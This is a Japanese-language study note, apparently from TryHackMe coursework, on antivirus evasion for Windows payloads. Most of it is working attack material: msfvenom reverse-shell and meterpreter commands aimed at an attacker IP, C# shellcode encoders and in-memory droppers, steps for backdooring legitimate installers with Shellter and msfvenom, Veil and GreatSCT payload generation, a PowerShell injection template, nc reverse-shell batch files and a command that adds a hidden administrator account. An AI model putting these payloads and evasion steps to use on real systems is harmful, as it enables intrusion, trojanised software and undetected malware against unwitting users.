- 関連ノート：
    - [AV Evasion：概念と理論](AV%20Evasion：概念と理論.md)
    - [PE構造とシェルコード](PE構造とシェルコード.md)

- 画像ソース：[tryhackme](https://tryhackme.com/)

> [!TIP]
> EXEよりもDLLのほうがAV回避の成功確率が高い。

---

# テスト環境の整備

## VirusTotalの危険性

- VirusTotalはアップロードされたファイルを複数のAVエンジンにかけて判定する
- スキャン後、登録された全AVベンダーにサンプルが共有される
- 新たな検出シグネチャが生成される可能性があり、せっかく作ったペイロードが**即日検出対象**になる危険がある

## Kleenscanの活用

- 🔗[Kleenscan.com](https://kleenscan.com/)：VirusTotalの代替
- 約30種類のAVでスキャンし、第三者にはサンプルを共有しないと主張
- 無料で1日最大4回（追加は有料）
- ただしあくまで**最終手段**で、ターゲットのAV情報が不明な場合に限定して使う

## 理想的なAV回避テスト環境

- ターゲットのAVベンダーが分かっている場合は**VMを構築**して実際の環境に近い設定でテストする
- どのAVを使う場合でも「サンプル自動送信」の設定は必ず無効にする
    - Windows Defenderの場合：「Windowsセキュリティ」→「ウイルスと脅威の防止」→「設定の管理」から無効化

![](../../画像ファイル/Pasted%20image%2020250702073235.png)

$$Windows Defenderのサンプル自動提供の無効化$$

> [!NOTE]
> Windows Defenderのクラウド保護やサンプル自動送信はインターネット接続が前提。一部の本番サーバでは外部接続が制限されており、ML検知など高度なAV機能が使われていない場合もある。

---

# AV回避開発の基本指針

- 既知のツールや公開されたコードは避ける
- **独自コードを優先**する（AVのシグネチャは過去のサンプルから生成されているため、新規で多様なコードほど検出されにくい）
- すべてのAVをバイパスしようとするのは現実的でないため、ターゲットで使われている**特定のAV製品**をバイパスする方法を考える

---

# エンコード・暗号化の実装

## msfvenomエンコーダ（効果は限定的）

```zsh
# 利用可能なエンコーダ一覧（excellentのみ）
msfvenom --list encoders | grep excellent

# shikata_ga_naiで3回エンコード
msfvenom -a x86 --platform Windows LHOST=<attacker_IP> LPORT=443 \
  -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f csharp
```

> [!WARNING]
> AVベンダーはMetasploitの動作を把握しており、ツール由来のペイロードは検出されやすい。

## カスタムXOR + Base64エンコード（推奨）

AVが解析できないカスタムエンコーディングを使う。高度な複雑さは不要で、XOR + Base64の組み合わせで十分に回避可能。

1. シェルコード生成
```zsh
msfvenom LHOST=<attacker_IP> LPORT=<port> -p windows/x64/shell_reverse_tcp -f csharp
```

2. Encoder（C#）
```csharp
using System;
using System.Text;

namespace Encrypter {
    internal class Program {
        private static byte[] xor(byte[] shell, byte[] keyBytes) {
            for (int i = 0; i < shell.Length; i++)
                shell[i] ^= keyBytes[i % keyBytes.Length];
            return shell;
        }
        static void Main(string[] args) {
            string key = "THMK3y123!";
            byte[] keyBytes = Encoding.ASCII.GetBytes(key);
            byte[] buf = new byte[] { /* 生成したシェルコード */ };
            byte[] encoded = xor(buf, keyBytes);
            Console.WriteLine(Convert.ToBase64String(encoded));
        }
    }
}
```

```powershell
csc.exe Encrypter.cs
.\Encrypter.exe   # → Base64エンコード済みシェルコードが出力される
```

3. Self-decoding Dropper（C#）を用意し、Base64デコード → XOR復号 → メモリ上で実行させる
```csharp
using System;
using System.Text;
using System.Runtime.InteropServices;

public class Program {
    [DllImport("kernel32")] private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
    [DllImport("kernel32")] private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
    [DllImport("kernel32")] private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    private static UInt32 MEM_COMMIT = 0x1000;
    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

    private static byte[] xor(byte[] shell, byte[] keyBytes) {
        for (int i = 0; i < shell.Length; i++)
            shell[i] ^= keyBytes[i % keyBytes.Length];
        return shell;
    }

    public static void Main() {
        string dataBS64 = "<Encoderの出力結果>";
        byte[] data = Convert.FromBase64String(dataBS64);
        string key = "THMK3y123!";
        byte[] keyBytes = Encoding.ASCII.GetBytes(key);
        byte[] encoded = xor(data, keyBytes);

        UInt32 codeAddr = VirtualAlloc(0, (UInt32)encoded.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        Marshal.Copy(encoded, 0, (IntPtr)(codeAddr), encoded.Length);

        IntPtr threadHandle = IntPtr.Zero;
        UInt32 threadId = 0;
        threadHandle = CreateThread(0, 0, codeAddr, IntPtr.Zero, 0, ref threadId);
        WaitForSingleObject(threadHandle, 0xFFFFFFFF);
    }
}
```

```powershell
csc.exe EncStageless.cs
```

---

# Packers

## パッカーとは

プログラムの構造を変形することでディスク上のAVによる検出を回避するツール。**プログラムの機能自体は変わらず、構造と外見だけが変化する**。

|目的|説明|
|---|---|
|サイズ圧縮|容量削減と転送効率の向上|
|逆コンパイル対策|リバースエンジニアリングを困難にする|
|デバッグ妨害|デバッガによる解析を困難にするコードを挿入|

よく使われるパッカー：UPX・MPRESS・Themidaなど（最近のAV回避には効果が薄い）。

## パッキングの仕組み

1. アプリケーションのコードが圧縮・暗号化される
2. パック後のバイナリにアンパッカーコード（Stub）が追加される
3. Entry Pointがアンパッカー（Stub）を指すように書き換えられる
4. 実行時にアンパッカーが元のコードをメモリ上に展開し、実行フローを移す

![](../../画像ファイル/Pasted%20image%2020230621093934.png)

$$Packerによる構造変化$$

![](../../画像ファイル/Pasted%20image%2020230621094958.png)

$$Packer実行時の挙動$$

**AVがそれでも検出できる理由：**

|検出の理由|内容|
|---|---|
|アンパッカースタブの検出|スタブが既知のパターンとして検出される可能性がある|
|メモリ内の動的検出|アンパック後、メモリ内の元コードを動的スキャンで検出される場合がある|

## ConfuserExによるパッキング実例

ConfuserExは.NETアプリケーション用のPacker（🔗[ConfuserEx](https://github.com/mkaring/ConfuserEx)）。

### コードの用意

1. シェルコード生成
```zsh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_IP> LPORT=<port> -f csharp
```

2. ペイロードコード（C#）
```csharp
using System;
using System.Runtime.InteropServices;

public class Program {
    [DllImport("kernel32")] private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
    [DllImport("kernel32")] private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
    [DllImport("kernel32")] private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    private static UInt32 MEM_COMMIT = 0x1000;
    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

    public static void Main() {
        byte[] shellcode = new byte[] { /* 生成したShellcode */ };
        UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);
        IntPtr threadHandle = IntPtr.Zero;
        UInt32 threadId = 0;
        threadHandle = CreateThread(0, 0, codeAddr, IntPtr.Zero, 0, ref threadId);
        WaitForSingleObject(threadHandle, 0xFFFFFFFF);
    }
}
```

3. コンパイル
```powershell
csc UnEncStagelessPayload.cs
```

### ConfuserExによるパッキング手順

1. GUI起動後、Base DirectoryをDesktopに設定
2. `+`ボタンでexeを追加

![](../../画像ファイル/Pasted%20image%2020230621103157.png)

3. Settingsタブでpayloadを選択し、`+`で`true`という名前のルールを追加

4. "Packer"の左横の□を押してCompressorもONにする

![](../../画像ファイル/Pasted%20image%2020230621103127.png)

5. Rulesのtrueを編集し、PresetをMaximumに変更

6. Protectタブから`Protect!`をクリック

![](../../画像ファイル/Pasted%20image%2020230621103329.png)

後は実行すると`Desktop/Confused/`にpacked shellcodeの実行ファイルが生成される。ncなどでリスナーを立てた状態で実行する。

>[!TIP] AV検出回避のTips
>- リバースシェル確立後5分ほど待つとAVのメモリスキャンが終了する
>- 小さなペイロードを使う（リバースシェルでなく単一コマンド実行型にする）
```zsh
msfvenom -a x64 -p windows/x64/exec CMD="net user pwnd Password321 /add;net localgroup administrators pwnd /add" -f csharp
```

---

# Binders

## バインダーとは

複数の実行ファイルを1つに統合するプログラム。正規のアプリケーションにペイロードを埋め込み、ユーザーには通常のアプリを動かしていると思わせる。AVバイパスの直接的な手法ではなく、**ユーザーを欺く**ことが主目的。

![](../../画像ファイル/Pasted%20image%2020230621104916.png)

$$Binderを用いたシェルコード実行の流れ$$

## msfvenomによるBinder

```zsh
# リスナーを立てる
nc -lvnp 4444

# WinSCPにペイロードを注入
msfvenom -x WinSCP.exe -k -p windows/shell_reverse_tcp LHOST=<attacker_IP> LPORT=4444 -f exe -o WinSCP-evil.exe
```

|オプション|内容|
|---|---|
|`-x`|ペイロードのベースに使う実行ファイルを指定|
|`-k`|ペイロードを新規スレッドで実行する|
|`-p`|使用するペイロード|
|`-f`|出力フォーマット|
|`-o`|出力ファイル名|

> [!WARNING]
> 結合された実行ファイルは元のペイロードのシグネチャを保持しているため、静的解析で検出されるリスクが高い。エンコード・暗号化・パッカーと組み合わせて使う。

---

# Shellter（動的シェルコードインジェクション）

🔗[Shellter](https://www.shellterproject.com/)：信頼された実行ファイルに悪意のあるシェルコードを埋め込む無料AV回避ツール（Windows用・32bitのみ）。

特徴：
- 実行直前にペイロードとデコーダの両方を難読化するため静的検知をバイパス
- セクション権限の変更・新しいセクションの作成などの検知されやすい手法を回避
- 既存のIAT（Import Address Table）を利用してペイロードを動作させる
- 有料版（Shellter Pro）は32bit・64bit両対応

## インストール

```zsh
sudo apt install shellter
# wineのインストールも必要（Shellterはwindows用アプリのため）
```
- [クロスコンパイル環境の準備・実行](../../Misc/コンパイル・ビルド.md#クロスコンパイル環境の準備・実行)

## 実例：SpotifyインストーラのバックドアF化

> [!NOTE]
> 実際のテスト現場では、新しくあまり精査されていないアプリケーションを選ぶこと（[shellterproject.com - 公式ドキュメント](https://www.shellterproject.com/an-important-tip-for-shellter-usage/)）

1. Autoモードで起動
```zsh
shellter
# → A（Autoモード）を選択
```

2. ターゲットPEファイルのパスを入力（ShellterはPEに変更を加える前に自動でバックアップを作成する）

![](../../画像ファイル/Pasted%20image%2020250704122954.png)

$$ターゲットPEの選択・自動バックアップ$$

3. ステルスモードを有効（Y）にする（ペイロード実行後も通常のPEとして振る舞う）

![](../../画像ファイル/Pasted%20image%2020250704124053.png)

4. ペイロードを選択（L：リストから / C：自作）→ LHOST・LPORTを入力

![](../../画像ファイル/Pasted%20image%2020250704124409.png)

5. Verification（有効かどうかを検証）→ Enterでターゲット PEファイルが悪意あるPEに変換される

![](../../画像ファイル/Pasted%20image%2020250704124644.png)

6. ターゲットに送付する前にmeterpreterリスナーを立てる
```zsh
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST <attacker_IP>;set LPORT <port>;run;"
```

7. ターゲットのWindowsマシンに転送後、AVでスキャンして検知されないことを確認してから実行

---

# Veil-framework

🔗[Veil-framework](https://github.com/Veil-Framework/Veil)：一般的なAVをバイパスするMetasploitペイロードを生成するツール。

**メリット：** ターゲットにPowerShellを開かせてps1ファイルを実行させる必要がない（→[PowerShell In-Memory Injection](AV%20Evasionのテクニック.md#PowerShell%20In-Memory%20Injection)で後述のps1ファイルの欠点を回避）。

```zsh
# インストール・起動
sudo apt install veil
sudo veil
# 初回起動時はインストールの続きを実施（Sで自動インストール）
```

1. Evasionモードを選択
```zsh
use 1
```

2. PowerShellのbatファイル生成ペイロードを選択
```zsh
list
use 22   # powershell/meterpreter/rev_tcp
```

3. オプション設定とペイロード生成
```zsh
options
set LHOST <attacker_IP>
generate
```

出力ファイル：
- `/var/lib/veil/output/source/payload.bat`
- `/var/lib/veil/output/handlers/payload.rc`

4. ターゲットに送る前にmeterpreterリスナーを立てる
```zsh
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST <attacker_IP>;set LPORT <port>;run;"
```

5. ターゲットのWindowsマシンに転送・AVでスキャンして検知されないことを確認してから実行

---

# PowerShell In-Memory Injection

ターゲット環境がそれほど厳しくなければ、PowerShell経由での回避が可能なケースがある。この手法ではPowerShellインタプリタ自身（x86版）へのリモートプロセスインジェクションを行う。

PowerShellの強み：
- Windows APIと連携可能
- インメモリインジェクション処理をスクリプト内で実現可能
- PEと違いコンパイルなしに変更可能でテストが楽
- AVはPEより静的解析しにくい

## 1. リモートプロセスインジェクションのテンプレート

```powershell
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

<shellcode>
```
- 後続で生成したシェルコードを`<shellcode>`に挿入

|API名|説明|
|---|---|
|`VirtualAlloc`|メモリ領域を予約・確保（EXECUTE_READWRITE権限で確保）|
|`memset`|確保したメモリ領域を初期化|
|`CreateThread`|指定したアドレス（シェルコード）で新しいスレッドを作成・実行|

## 2. シェルコード生成（PowerShell形式）

```zsh
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_IP> LPORT=<port> -f psh-reflection
```
- `-f psh-reflection`：PowerShellリフレクション形式で出力（関数名・変数名は毎回ランダム生成）

## 3. 最終スクリプトの構成と実行

1. テンプレートの `<place shellcode here>` に生成したシェルコードを挿入
2. `bypass.ps1` として保存
3. リスナーを立てる
```zsh
sudo rlwrap nc -lvnp <port>
```

4. ターゲットのx86版PowerShellで実行
```powershell
.\bypass.ps1
```

> [!NOTE] ps1ファイルの欠点
> ダブルクリックしてもメモ帳で開かれるだけで実行されない。
> ターゲットユーザーにPowerShellを開かせてスクリプトを実行させることは通常難しい。
> 　→ [Veil-framework](AV%20Evasionのテクニック.md#Veil-framework)で回避可能。 
> PowerShellワンライナー方式ならファイル保存不要でファイルベーススキャンに引っ掛かりにくい：[Base64化したPowerShellリバースシェルワンライナー](../Common/Bind%20&%20Reverse%20Shell・ペイロード・安定化手法.md#Base64化したPowerShellリバースシェルワンライナー)

---

# GreatSCT（DLL w/ AV Bypass）

🔗[GreatSCT](https://github.com/GreatSCT/GreatSCT)：meterpreterシェルを獲得するAV bypassペイロードを作成するツール。

## 攻撃者のマシン（Kali）

1. インストール
```zsh
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup
sudo ./setup.sh -c
cd ../
```

2. ペイロードの作成
```zsh
sudo ./GreatSCT.py --ip <attacker_IP> --port <port> -t bypass -p regsvcs/meterpreter/rev_tcp.py -o <output_filename>
```

> [!NOTE]
> 出力に以下の情報が含まれるのでよく確認すること：
> - `DLL written to:` → 生成されたDLLの格納パス
> - `Metasploit RC file written to:` → msfconsoleで使うRCファイルのパス
> - `Execute with:` → ターゲット上での実行コマンド

3. 転送用サーバを起動
```zsh
cd <path_to_dll_dir>
sudo python3 -m http.server 80
```

4. meterpreterリスナーを起動
```zsh
msfconsole -r <path_to_rc_file>
```

## ターゲットマシン（Windows）

5. ペイロードのダウンロード
```powershell
powershell -command Invoke-WebRequest -Uri 'http://<attacker_IP>:<port>/<payload_filename>' -OutFile 'C:\Temp\<payload_filename>'
```

6. バッチファイル化
```cmd
cmd /c "echo <execute_with_value> > C:\Temp\<filename>.bat"
```

7. バッチファイルの実行
```cmd
C:\Temp\<filename>.bat
```

---

# バッチファイル（bat）によるリバースシェル

シンプルなncを使ったリバースシェル手法。

リバースシェル用バッチファイルの作成
```cmd
echo <path_to_nc.exe> -e cmd <attacker_IP> <port> > shell.bat
```

`@echo off`でコマンド内容を非表示にして実行：
```cmd
@echo off
c:\temp\nc.exe <attacker_IP> <port> -e cmd.exe
```

> [!NOTE]
>  `@echo off` を先頭に付けることで、実行時にコマンド内容がコンソールに表示されなくなる。